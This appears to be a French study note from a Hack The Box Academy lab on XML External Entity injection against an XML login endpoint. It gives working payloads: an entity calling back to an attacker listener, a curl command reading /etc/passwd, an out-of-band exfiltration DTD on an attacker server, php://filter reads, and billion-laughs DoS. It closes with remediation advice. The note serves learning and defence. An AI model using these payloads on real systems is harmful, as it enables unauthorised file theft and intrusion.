---
titre: "XML External Entity (XXE) Injection"
aliases:
  - "XML External Entity (XXE) Injection"
plateforme: "Hack The Box Academy"
module: "Web Service & API Attacks"
date: 2026-07-02
tags: [HTB, API, WebService, XXE, XML, FileRead, Notes]
---

# 🧩 XML External Entity (XXE) Injection

Lié : [[16 - Arsenal Scripts SQLi]] · [[18 - Cheatsheet Payloads]] · [[12 - SSRF]] · [[10 - LFI]]

---

## Principe

Le XML supporte des **entités** (variables) : `&nom;` est remplacé par sa valeur. Les entités **externes** (`SYSTEM`) vont chercher leur valeur ailleurs — une URL distante ou un **fichier local** via `file://`. Si une app parse du XML **contrôlé** sans désactiver cette fonctionnalité → XXE.

Une XXE combine plusieurs vecteurs :
- lecture de fichiers locaux (comme [[10 - LFI]])
- requêtes réseau (comme [[12 - SSRF]])
- parfois DoS (billion laughs)

> 🔑 Réflexe déclencheur : **tout endpoint qui accepte du XML** (login SOAP, upload de docs, RSS, SVG, DOCX/XLSX = XML zippé). Content-Type `text/xml`, `application/xml`, ou `text/plain` contenant du XML.

---

## Cas du module (port 3001, login XML)

Requête interceptée (Burp) :
```xml
<?xml version="1.0" encoding="UTF-8"?>
<root><email>test@test.com</email><password>P@ssw0rd123</password></root>
```

### Étape 1 — injecter un DOCTYPE + entité externe
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://TON_IP:4444"> ]>
<root><email>test@test.com</email><password>P@ssw0rd123</password></root>
```

### Étape 2 — le piège : DÉFINIR ≠ UTILISER
Avec le payload ci-dessus, **rien ne se passe** (l'entité est déclarée mais jamais appelée). Il faut l'**invoquer** :
```xml
<root><email>&somename;</email><password>P@ssw0rd123</password></root>
```
→ le parser résout `&somename;` → requête vers ton listener → `nc` reçoit la connexion. XXE confirmée.

> Deux temps à ne pas confondre :
> - `<!ENTITY somename SYSTEM "...">` = **déclaration** (dans le DOCTYPE)
> - `&somename;` = **invocation** (dans le body)
> Sans invocation, la déclaration est inerte (même logique que la SSRF).

### Étape 3 — lire un fichier interne (schéma `file://`)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE pwn [<!ENTITY somename SYSTEM "file:///etc/passwd"> ]>
<root><email>&somename;</email><password>P@ssw0rd123</password></root>
```
```bash
curl -X POST http://<TARGET>:3001/api/login -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE pwn [<!ENTITY somename SYSTEM "file:///etc/passwd"> ]><root><email>&somename;</email><password>P@ssw0rd123</password></root>'
```
Astuce **in-band** : l'app réfléchit le champ email dans son erreur —
`Sorry, we cannot find a account with <b>...</b> email.` — donc `/etc/passwd` s'affiche dans la réponse.

> ❓ *Question HTB* : schéma URI pour lire un fichier interne → **`file`** (`file:///etc/passwd`). `http`/`https` = requête réseau (SSRF), `data` = inline.

---

## Variantes à connaître

- **In-band** (ce cas) : le fichier revient dans la réponse. Le plus simple.
- **Out-of-band (OOB)** : la donnée ne revient pas → l'exfiltrer vers ton serveur via une **DTD externe** (`<!ENTITY % dtd SYSTEM "http://ton-vps/evil.dtd">`).
- **`php://filter`** (cibles PHP) : `php://filter/convert.base64-encode/resource=/etc/passwd` — encode en base64 les fichiers dont le contenu casserait le XML.
- **Billion laughs** : entités récursives → DoS.

---

## Remédiation

- **Désactiver le traitement des entités externes** dans le parser XML (1-2 lignes selon la lib). LA remédiation standard.
- Désactiver les DTD, utiliser des parsers sûrs par défaut.
